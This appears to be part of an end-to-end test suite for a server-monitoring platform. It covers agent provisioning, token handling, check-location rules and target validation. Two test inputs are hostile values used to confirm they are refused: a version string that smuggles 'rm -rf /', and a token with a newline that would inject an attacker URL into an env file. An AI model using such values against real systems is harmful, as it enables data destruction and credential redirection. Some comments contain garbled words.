  await pullWithVersion('bad version; rm -rf /');
  chk('a version that is not a version is ignored rather than stored',
    (await nodeRow()).agent_version === '0.4.0-rc1');
  await pullWithVersion(null);
  chk('…and a pull without the header leaves the last one alone',
    (await nodeRow()).agent_version === '0.4.0-rc1');

  const dl = await fetch(`${BASE}/v1/synthetics/agent`, { headers: { Authorization: `Bearer ${mgKey}` } });
  const script = await dl.text();
  chk('a probe key may download the agent it should be running', dl.status === 200);
  chk('…and it is the real script, not a stub', /const VERSION = '/.test(script) && script.length > 10000);
  chk('…served as javascript', /javascript/.test(dl.headers.get('content-type') || ''));
  chk('an unauthenticated caller may not', (await fetch(`${BASE}/v1/synthetics/agent`)).status === 401);
  chk('…nor one with a wrong key',
    (await fetch(`${BASE}/v1/synthetics/agent`, { headers: { Authorization: 'Bearer ocs_nope' } })).status === 401);

  // ── 12. a managed node is also a HOST AGENT ───────────────────────────────
  /* One binary, two roles. The sensor role (probe key) says how many checks ran;
   * the host role (agent token) says whether the box could have run more. Until
   * now a provisioned node only ever ran the first, so the fleet screen could
   * report a node falling behind and nothing at all about why.
   *
   * Three of these fail SILENTLY, which is why they are asserted on rows rather
   * than on a response body: a token that never reaches cloud-init gives a node
   * that boots and simply never reports (provisioning answers `{status:
   * 'provisioning'}` either way); an `agents` row left behind by a failed
   * provision or a teardown is a LIVE agent token for a machine that does not
   * exist; and a host block that renders 0 instead of null is a claim that a box
   * we have never heard from is idle. */
  const ciTok = render({ opscatUrl: 'https://opscat.io', probeKey: SKEY, agentToken: AKEY });
  chk('a token given to cloud-init reaches the unit environment',
    ciTok.includes(`OPSCAT_AGENT_TOKEN=${AKEY}`));
  chk('…alongside the sensor key, so one process serves both roles',
    ciTok.includes(`OPSCAT_PROBE_KEY=${SKEY}`) && /OPSCAT_AGENT_FLAGS=--probe/.test(ciTok));
  chk('…and a node provisioned without one is the sensor-only box this always produced',
    !ciOff.includes('OPSCAT_AGENT_TOKEN'));
  // Same class of mistake as the ssh key: this is an env FILE built by
  // interpolation, so a value with a newline writes a variable of its own.
  chk('a token that is not a token is refused rather than interpolated',
    refuses(() => providers.renderCloudInit({
      opscatUrl: 'https://opscat.io', probeKey: SKEY, agentToken: 'oca_x\nOPSCAT_URL=http://evil' })));

  const pcred = await call(su, 'POST', '/api/superadmin/platform-credentials',
    { provider: 'aws', label: 'platform-e2e', secret: { accessKeyId: 'AKIAPLATFORM', secretAccessKey: 'shh' } });
  chk('a platform credential can be stored', pcred.status === 200);

  const agentCount = async () => Number((await q.prepare('SELECT COUNT(*) c FROM agents').get()).c);
  const before = await agentCount();
  cloud.ssh.length = 0; cloud.created.length = 0; cloud.seq.length = 0;
  const mProv = await call(su, 'POST', '/api/superadmin/managed-locations',
    { city: 'Frankfurt', cc: 'DE', region: 'Europe', provider: 'aws',
      providerRegion: 'eu-central-1', credentialId: pcred.j.id });
  chk('a managed node can be provisioned', mProv.status === 200, JSON.stringify(mProv.j));
  const provId = mProv.j.id;
  const provNode = await q.prepare(`SELECT n.* FROM sensor_nodes n
    JOIN synthetic_locations l ON l.node_id = n.id WHERE l.id = ?`).get(provId);
  chk('the node is linked to a host-agent registration', !!provNode && provNode.agent_id != null);
  const provAgent = await q.prepare('SELECT * FROM agents WHERE id = ?').get(provNode.agent_id);
  chk('…which exists, in the platform org', !!provAgent && provAgent.org_id === DEFAULT_ORG_ID);
  chk('…grouped so the fleet is one thing in Assets › Agents', provAgent.grp === 'sensors');
  // agents.name is UNIQUE and two nodes in one city is the ordinary case, so the
  // node id is IN the name rather than looked up and appended on collision.
  chk('…and named for the location AND the node, which is what makes it unique',
    provAgent.name === `Sensor Frankfurt DE (node ${provNode.id})`, provAgent.name);
  chk('exactly one registration was created', (await agentCount()) === before + 1);
  // The orphan sweeper reads its region list from HERE, not from sensor_nodes —
  // that is the table it deletes from (migration 029). If this write is lost the
  // sweeper simply stops looking in the region and a leaked instance bills
  // forever, with no error anywhere; e2e-vendors asserts the reading half.
  chk('the launch recorded WHERE it launched, for the orphan sweeper',
    !!(await q.prepare(`SELECT 1 x FROM cloud_regions_used
      WHERE credential_id = ? AND region = 'eu-central-1'`).get(pcred.j.id)));

  const tokLine = /OPSCAT_AGENT_TOKEN=(oca_[a-f0-9]+)/.exec(cloud.created[0].userData);
  chk('the token reached the boot document', !!tokLine);
  // `tokLine &&` is not defensive noise: without it the mutation that drops the
  // token from cloud-init kills the RUN with a TypeError instead of failing the
  // two checks that are about it, and a harness that dies reports nothing.
  chk('…and only its HASH is at rest — the row cannot ring the node back',
    !!tokLine && provAgent.token_hash === sha256(tokLine[1]) && provAgent.token_hash !== tokLine[1]);
  // A second node in the same city must not 500 on the UNIQUE name.
  const mProv2 = await call(su, 'POST', '/api/superadmin/managed-locations',
    { city: 'Frankfurt', cc: 'DE', region: 'Europe', provider: 'aws',
      providerRegion: 'eu-central-1', credentialId: pcred.j.id });
  chk('a SECOND node in the same city provisions rather than colliding on the name',
    mProv2.status === 200, JSON.stringify(mProv2.j));

  // Break-glass SSH on the MANAGED fleet — the path the in-app wizard drives, and
  // the fleet we are actually on the hook for. It reads the PLATFORM org's
  // settings, not the acting admin's org.
  chk('with no platform key configured, no inbound rule is ensured', cloud.ssh.length === 0);
  await q.prepare(`INSERT INTO org_settings (org_id, key, value) VALUES (?, 'sensor_ssh_key', ?)
    ON CONFLICT (org_id, key) DO UPDATE SET value = excluded.value`).run(DEFAULT_ORG_ID, KEY);
  await q.prepare(`INSERT INTO org_settings (org_id, key, value) VALUES (?, 'sensor_ssh_cidrs', '91.98.197.223')
    ON CONFLICT (org_id, key) DO UPDATE SET value = excluded.value`).run(DEFAULT_ORG_ID);
  await loadSettingsCache();
  cloud.ssh.length = 0; cloud.created.length = 0; cloud.seq.length = 0;
  const mProv3 = await call(su, 'POST', '/api/superadmin/managed-locations',
    { city: 'Ireland', cc: 'IE', region: 'Europe', provider: 'aws',
      providerRegion: 'eu-west-1', credentialId: pcred.j.id });
  chk('provisioning still succeeds with break-glass SSH on', mProv3.status === 200);
  chk('the inbound rule was ensured for the managed fleet too', cloud.ssh.length === 1);
  chk('…with the PLATFORM org\'s ranges, not the acting admin\'s',
    cloud.ssh[0] && cloud.ssh[0].cidrs.join('|') === '91.98.197.223/32', String(cloud.ssh[0] && cloud.ssh[0].cidrs));
  chk('…before the instance exists', cloud.seq.join('>') === 'ssh>create', cloud.seq.join('>'));
  chk('the node was launched into that group',
    cloud.created[0] && cloud.created[0].securityGroupId === 'sg-0e2e');
  chk('and the key is in the boot document beside the agent token',
    cloud.created[0].userData.includes(KEY) && /OPSCAT_AGENT_TOKEN=oca_/.test(cloud.created[0].userData));

  // A failed provision must leave no live token behind.
  const beforeFail = await agentCount();
  cloud.failSsh = 'aws: no default VPC in ap-south-1';
  const mFail = await call(su, 'POST', '/api/superadmin/managed-locations',
    { city: 'Mumbai', cc: 'IN', region: 'Asia', provider: 'aws',
      providerRegion: 'ap-south-1', credentialId: pcred.j.id });
  cloud.failSsh = null;
  chk('a failing provision answers 502', mFail.status === 502, String(mFail.status));
  // …and records no region: an instance that was never created cannot be
  // orphaned, so a failed launch must not widen the sweeper's search.
  chk('…and records no region for a launch that never happened',
    !(await q.prepare(`SELECT 1 x FROM cloud_regions_used
      WHERE credential_id = ? AND region = 'ap-south-1'`).get(pcred.j.id)));
  chk('…and leaves NO host-agent registration behind — that would be a live token '
    + 'for a machine that does not exist', (await agentCount()) === beforeFail);

  // ── the host block the fleet screen renders ───────────────────────────────
  const detail = async (id) => (await call(su, 'GET', `/api/superadmin/managed-locations/${id}`)).j;
  const noHost = await detail(mgId);
  chk('a node provisioned before this existed reports host: null, not a block of zeroes',
    noHost.host === null);

  const d0 = await detail(provId);
  chk('a registered node has a host block', d0.host && d0.host.agentId === provNode.agent_id);
  chk('…which says it has never checked in', d0.host.reporting === false && d0.host.lastSeenAt === null);
  chk('…and reports NOTHING rather than an idle box', d0.host.cpuPct === null
    && d0.host.memPct === null && d0.host.diskPct === null && d0.host.load1 === null);

  const mNow = Math.floor(now() / 60000) * 60000;
  await q.prepare(`INSERT INTO agent_metrics (agent_id, ts, cpu_pct, load1, mem_used, mem_total,
      disk_used, disk_total) VALUES (?, ?, 12.5, 0.4, 1000, 4000, 3000, 4000)`)
    .run(provNode.agent_id, mNow - 120000);
  await q.prepare(`INSERT INTO agent_metrics (agent_id, ts, cpu_pct, load1, mem_used, mem_total,
      disk_used, disk_total) VALUES (?, ?, 73.25, 1.75, 3000, 4000, 900, 4000)`)
    .run(provNode.agent_id, mNow);
  await q.prepare('UPDATE agents SET last_seen_at = ?, version = ? WHERE id = ?')
    .run(now(), '0.4.0', provNode.agent_id);
  const d1 = await detail(provId);
  chk('the LATEST sample is the one reported, not the first row the table returns',
    d1.host.cpuPct === 73.3, String(d1.host.cpuPct));
  chk('memory is a percentage of the total, not the raw byte count', d1.host.memPct === 75);
  chk('…and the total comes with it, so the number can be read', d1.host.memTotal === 4000);
  chk('disk is its own percentage', d1.host.diskPct === 22.5, String(d1.host.diskPct));
  chk('load is reported as measured', d1.host.load1 === 1.75);
  chk('a fresh check-in reads as reporting', d1.host.reporting === true);
  chk('…and the agent version comes from the host role', d1.host.version === '0.4.0');

  await q.prepare('UPDATE agents SET last_seen_at = ? WHERE id = ?')
    .run(now() - 6 * 60 * 1000, provNode.agent_id);
  const d2 = await detail(provId);
  chk('an agent silent for six minutes is not "reporting" — the same 5 min window '
    + 'the node\'s own online flag uses', d2.host.reporting === false);
  chk('…but its last sample is still shown, with when it was taken',
    d2.host.cpuPct === 73.3 && d2.host.ts === mNow);

  // Teardown: the registration dies with the node it belongs to.
  const beforeTear = await agentCount();
  const tear = await call(su, 'DELETE', `/api/superadmin/managed-locations/${provId}`);
  chk('a managed node can be torn down', tear.status === 200, JSON.stringify(tear.j));
  chk('…and its host-agent registration goes with it', (await agentCount()) === beforeTear - 1);
  chk('…specifically THAT one',
    !(await q.prepare('SELECT 1 x FROM agents WHERE id = ?').get(provNode.agent_id)));

  // The sweeper's path: a process that died between the two writes leaves a node
  // that never got an instance id. Dropping it must drop the token too.
  const strandedAgent = Number(await q.prepare(`INSERT INTO agents
      (org_id, name, grp, token_hash, created_at) VALUES (?, 'Sensor Stranded', 'sensors', ?, ?)`)
    .insert(DEFAULT_ORG_ID, sha256('oca_' + 'b'.repeat(48)), now()));
  const strandedNode = Number(await q.prepare(`INSERT INTO sensor_nodes
      (provider, provider_region, instance_class, agent_id, status, created_at)
    VALUES ('aws', 'us-east-2', 'standard', ?, 'provisioning', ?)`)
    .insert(strandedAgent, now() - 2 * 60 * 60 * 1000));
  await require('./src/engine/reconcile').sweep();
  chk('reconcile drops a node that never came up', !(await q.prepare(
    'SELECT 1 x FROM sensor_nodes WHERE id = ?').get(strandedNode)));
  chk('…and its registration with it, rather than leaving a token nobody can trace',
    !(await q.prepare('SELECT 1 x FROM agents WHERE id = ?').get(strandedAgent)));

  // ── 13. "all agents" means the fleet that exists, not the one that will ────
  //
  // `check_locations` used an absent row set to mean "every agent, including
  // ones booked later", and the check dialog promised exactly that. So booking a
  // managed sensor attached every existing check in the org to it: a node on
  // another continent starts billing, and every uptime and latency series
  // quietly gains a vantage point, with nobody having clicked anything.
  //
  // The rows are written out on create now. Two of these are ABSENCES and they
  // are the ones that distinguish this fix from a wrong one — expanding to every
  // visible managed location regardless of booking passes everything else here
  // (measured: 160/162, and only those two go red).
  //
  // An absence is vacuous against the OLD behaviour, though: with no rows at
  // all, "does not include the unbooked one" is trivially true. What stops that
  // from reading as a pass is the check above them — "stored as explicit rows,
  // not as the absence of any" — which fails first and loudly. Measured both
  // ways: removing the expansion leaves the two absences green and takes the
  // other four with it.
  const clOf = async (id) => (await q.prepare(
    'SELECT location_id FROM check_locations WHERE check_id = ? ORDER BY location_id').all(id))
    .map((r) => Number(r.location_id));

  // Its own managed location: `mgId` was booked back in section 9, and a fixture
  // that is already in the state under test proves nothing — measured, this is
  // how the first version of these checks failed.
  const freeLoc = Number(await q.prepare(`INSERT INTO synthetic_locations
      (org_id, city, cc, kind, region, provider, visible, active, created_at)
    VALUES (NULL, 'Unbookedville', 'US', 'managed', 'North America', 'aws', 1, 1, ?)`)
    .insert(now()));

  const allChk = (await call(lead, 'POST', '/api/synthetics/checks',
    { type: 'tcp', target: 'fleet.example:443', locationIds: [] })).j.id;
  const allLocs = await clOf(allChk);
  chk('"all agents" is stored as explicit rows, not as the absence of any',
    allLocs.length > 0, `${allLocs.length} rows`);
  chk('…covering the location the org owns', allLocs.includes(Number(locId)));
  chk('…and the managed location it HAS booked', allLocs.includes(mgId));
  chk('…but not one it has not', !allLocs.includes(freeLoc),
    `rows: ${JSON.stringify(allLocs)}`);

  await q.prepare(`INSERT INTO org_location_access (org_id, location_id, source, created_at)
    VALUES (?, ?, 'plan', ?) ON CONFLICT DO NOTHING`).run(ACME, freeLoc, now());

  chk('booking a managed sensor does NOT attach a check that already existed',
    !(await clOf(allChk)).includes(freeLoc), `rows: ${JSON.stringify(await clOf(allChk))}`);

  const laterChk = (await call(lead, 'POST', '/api/synthetics/checks',
    { type: 'tcp', target: 'later.example:443', locationIds: [] })).j.id;
  chk('…while a check created afterwards does pick the booked sensor up',
    (await clOf(laterChk)).includes(freeLoc), `rows: ${JSON.stringify(await clOf(laterChk))}`);

  // The expansion runs before the per-id access filter, so it must not become a
  // way to name a location the caller could not have named itself.
  const pinChk = (await call(lead, 'POST', '/api/synthetics/checks',
    { type: 'tcp', target: 'pinned.example:443', locationIds: [locId] })).j.id;
  chk('an explicit list is still taken verbatim', JSON.stringify(await clOf(pinChk))
    === JSON.stringify([Number(locId)]), `rows: ${JSON.stringify(await clOf(pinChk))}`);

  // ── 14. the agent NAME namespace ──────────────────────────────────────────
  // `agents.name` was UNIQUE across the whole table, i.e. across every tenant,
  // and the duplicate pre-check in routes/admin.js had no `org_id` either. The
  // symptom was not a subtle one: onboarding's Server Agent tab registers an
  // agent called `my-first-server`, so the FIRST organisation on an instance to
  // open that tab took the name away from every other one — every later org got
  // a 409 about a row it is not allowed to see, and the tab sat on
  // "registering agent…" forever. Fixed by migration 032 (UNIQUE (org_id, name))
  // plus the scoped lookup; these are the checks that were red before it.
  const BETA = await mkOrg('Beta-sensors', 'enterprise');
  const betaLead = await login(await mkUser('lead@beta.sensors', 'lead', BETA));
  const agentsNamed = async (orgId) => (await q.prepare(
    'SELECT COUNT(*) c FROM agents WHERE org_id = ? AND name = ?').get(orgId, 'my-first-server')).c;

  const firstAgent = await call(lead, 'POST', '/api/admin/agents', { name: 'my-first-server' });
  chk('an org registers the name onboarding uses', firstAgent.status === 200, JSON.stringify(firstAgent.j));
  chk('…and is handed a token it can install with',
    typeof firstAgent.j.token === 'string' && firstAgent.j.token.startsWith('oca_'));

  const otherOrg = await call(betaLead, 'POST', '/api/admin/agents', { name: 'my-first-server' });
  chk('ANOTHER org may use the same name — a label is not a namespace',
    otherOrg.status === 200, JSON.stringify(otherOrg.j));
  chk('…and both rows exist, one per org',
    (await agentsNamed(ACME)) === 1 && (await agentsNamed(BETA)) === 1);
  chk('…with different tokens', otherOrg.j.token !== firstAgent.j.token);

  const dupe = await call(lead, 'POST', '/api/admin/agents', { name: 'my-first-server' });
  chk('the SAME org is still refused a second time', dupe.status === 409, JSON.stringify(dupe.j));
  // A refusal is only a refusal if nothing happened: a 409 written onto a
  // response after the INSERT already landed reads identically from here.
  chk('…and the refusal wrote no second row', (await agentsNamed(ACME)) === 1);

  // ── 15. a check must have a target the probe can resolve ──────────────────
  // `isStr(target, 300)` was the whole gate, so the onboarding form's own
  // placeholder — a bare `https://` — created a live check. It is not an
  // inert row: it runs every interval, fails with `invalid url`, and the
  // uptime column then reports the endpoint as DOWN rather than the address as
  // nonsense. Refused at the write instead, where the person who typed it is.
  const checksTargeted = async (t) => (await q.prepare(
    'SELECT COUNT(*) c FROM synthetic_checks WHERE org_id = ? AND target = ?').get(ACME, t)).c;

  const bare = await call(lead, 'POST', '/api/synthetics/checks', { type: 'http', target: 'https://' });
  chk('a scheme with no host is refused', bare.status === 400, JSON.stringify(bare.j));
  chk('…and says what to type instead', /URL/i.test(String(bare.j && bare.j.error)), JSON.stringify(bare.j));
  chk('…and wrote no check', (await checksTargeted('https://')) === 0);
  chk('an empty target is refused',
    (await call(lead, 'POST', '/api/synthetics/checks', { type: 'http', target: '   ' })).status === 400);
  chk('a target with a space is refused',
    (await call(lead, 'POST', '/api/synthetics/checks', { type: 'http', target: 'https://ac me.test' })).status === 400);
  chk('a tcp port outside 1-65535 is refused',
    (await call(lead, 'POST', '/api/synthetics/checks', { type: 'tcp', target: 'db.acme.test:99999' })).status === 400);

  const good = await call(lead, 'POST', '/api/synthetics/checks',
    { type: 'http', target: 'https://acme.test/health' });
  chk('a real URL still goes through', good.status === 200, JSON.stringify(good.j));
  chk('a single-label host is NOT rejected — `core-switch-01` is a target',
    (await call(lead, 'POST', '/api/synthetics/checks', { type: 'icmp', target: 'core-switch-01' })).status === 200);
  chk('a dns check may name its resolver',
    (await call(lead, 'POST', '/api/synthetics/checks', { type: 'dns', target: 'acme.test @ 1.1.1.1' })).status === 200);
  chk('a tcp host:port still goes through',
    (await call(lead, 'POST', '/api/synthetics/checks', { type: 'tcp', target: 'db.acme.test:5432' })).status === 200);

  // The interval the response reports is the one that was WRITTEN. A plan floor
  // silently lifting 30s to 60s while the caller prints the number it asked for
  // is the same shape as a status nobody measured — and onboarding renders this
  // value straight into its check list.
  const stored = async (id) => (await q.prepare(
    'SELECT interval_s FROM synthetic_checks WHERE id = ?').get(id)).interval_s;
  chk('the create response reports the interval it stored', good.j.intervalS === await stored(good.j.id));
  const floored = await call(lead, 'POST', '/api/synthetics/checks',
    { type: 'http', target: 'https://acme.test/floor', intervalS: 3 });
  chk('an interval under the plan floor is raised', await stored(floored.j.id) > 3);
  chk('…and the response says the raised value, not the one asked for',
    floored.j.intervalS === await stored(floored.j.id), JSON.stringify(floored.j));

  // The edit path is the same door. Refusing only on create leaves the invalid
  // state one PATCH away, and PATCH is how a typo gets "fixed".
  const patchBad = await call(lead, 'PATCH', `/api/synthetics/checks/${good.j.id}`, { target: 'https://' });
  chk('an edit to a target with no host is refused too', patchBad.status === 400, JSON.stringify(patchBad.j));
  chk('…and the check kept the target it had',
    (await q.prepare('SELECT target FROM synthetic_checks WHERE id = ?').get(good.j.id)).target
      === 'https://acme.test/health');
  // ── 16. the canonical target, and the agent actually getting it ───────────
  //
  // §15 refuses a target that can never workList. This is the other half: a target
  // that DOES workList has to reach the Sensor Agent in a form it can fetch.
  //
  // A person types `link11.com`. That is a fine thing to monitor and it is not
  // a URL, so something has to add the scheme — and TWO things did, differently.
  // engine/synthetics.js prepended `https://`; agent/opscat-agent.js called
  // fetch(target) straight, where undici answers `TypeError: Failed to parse URL
  // from link11.com`. One check, green from Nuremberg, red from N. Virginia and
  // Los Angeles, with a message about OUR parser shown where the customer reads
  // "is my site up?".
  //
  // The check that matters is the second one. Asserting the stored value is
  // normalised tests the writer; asserting that the value THE AGENT IS HANDED
  // parses is the property that was actually violated, stated the way the agent
  // experiences it — and it stays true if the workList list ever stops serving the
  // column verbatim.
  const ownLocal = Number(await q.prepare(`INSERT INTO synthetic_locations
      (org_id, city, cc, kind, active, created_at)
    VALUES (?, 'Localville', 'DE', 'local', 1, ?)`).insert(ACME, now()));

  const schemeless = (await call(lead, 'POST', '/api/synthetics/checks',
    { type: 'http', target: 'link11.com', locationIds: [locId] })).j.id;
  chk('a scheme-less target is stored with one', (await q.prepare(
    'SELECT target FROM synthetic_checks WHERE id = ?').get(schemeless)).target === 'https://link11.com');

  const workList = await (await fetch(`${BASE}/v1/synthetics/checks`,
    { headers: { Authorization: `Bearer ${probeKey}` } })).json();
  const servedChk = workList.find((c) => c.id === schemeless);
  let agentCanFetch = false;
  try { agentCanFetch = !!(servedChk && new URL(servedChk.target)); } catch { agentCanFetch = false; }
  chk('…and every target the Sensor Agent is handed is one it can fetch',
    agentCanFetch, `servedChk: ${servedChk && JSON.stringify(servedChk.target)}`);

  await call(lead, 'PATCH', `/api/synthetics/checks/${schemeless}`, { target: 'lynk.run' });
  chk('an edit is canonicalised the same way — the edit path is not a way around it',
    (await q.prepare('SELECT target FROM synthetic_checks WHERE id = ?').get(schemeless)).target
      === 'https://lynk.run');

  // ── runNow: a new check carries a verdict, not an empty bar ────────────────
  const synth = require('./src/engine/synthetics');
  const realHttp = synth.RUNNERS.http;
  synth.RUNNERS.http = async () => ({ ok: true, latency: 7, meta: { status: 200 } });
  try {
    const resultsOf = async (id) => (await q.prepare(
      'SELECT COUNT(*) c FROM synthetic_results WHERE check_id = ?').get(id)).c;

    const eager = (await call(lead, 'POST', '/api/synthetics/checks',
      { type: 'http', target: 'https://eager.example', locationIds: [ownLocal], runNow: true })).j;
    chk('runNow reports that it ran', eager.ran === true);
    chk('…and the result is already there when the create returns — no tick waited on',
      (await resultsOf(eager.id)) === 1, `${await resultsOf(eager.id)} rows`);

    const lazy = (await call(lead, 'POST', '/api/synthetics/checks',
      { type: 'http', target: 'https://lazy.example', locationIds: [ownLocal] })).j;
    chk('…while leaving it out runs nothing', lazy.ran === false);
    chk('…and writes no result', (await resultsOf(lazy.id)) === 0, `${await resultsOf(lazy.id)} rows`);

    // The honest null: nothing local to run means nothing is invented.
    const remoteOnly = (await call(lead, 'POST', '/api/synthetics/checks',
      { type: 'http', target: 'https://remote.example', locationIds: [locId], runNow: true })).j;
    chk('a check assigned to remote agents only reports that nothing ran locally',
      remoteOnly.ran === false);
    chk('…rather than inventing a result from a probe it does not run on',
      (await resultsOf(remoteOnly.id)) === 0);
  } finally { synth.RUNNERS.http = realHttp; }


  report();
}

main().catch((e) => { console.error(e); process.exit(1); });
